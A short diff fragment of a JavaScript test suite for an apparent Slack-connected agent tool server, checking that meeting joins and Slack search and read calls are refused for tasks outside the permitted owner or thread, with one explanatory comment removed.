       const r = await s.call('meeting_join', { channel, thread_ts, link: 'https://meet.google.com/abc-defg-hij' })
       assert.equal(r.isError, true)
@@ -1457,7 +1424,7 @@ describe('Slack reads', () => {
       { task: { ...s.task(), agent: { app: 'ATEST0001', tag: 'UAGENT001' } }, at: { channel: 'C1', thread_ts: '5.5' } },
       { task: s.task(), at: { channel: 'C1', thread_ts: '9.9' } },
     ]
-    s.t.onTask(s.task())   // the owner wrote first in C1:5.5, so the teammate's task after it must still be refused
+    s.t.onTask(s.task())
     for (const { task, at } of tries) {
       s.t.onTask(task)
       for (const name of ['slack_search', 'slack_read']) assert.equal((await s.call(name, { ...at, query: 'test', channel_id: 'C0TEST1' })).isError, true, `${name} ${JSON.stringify(at)}`)
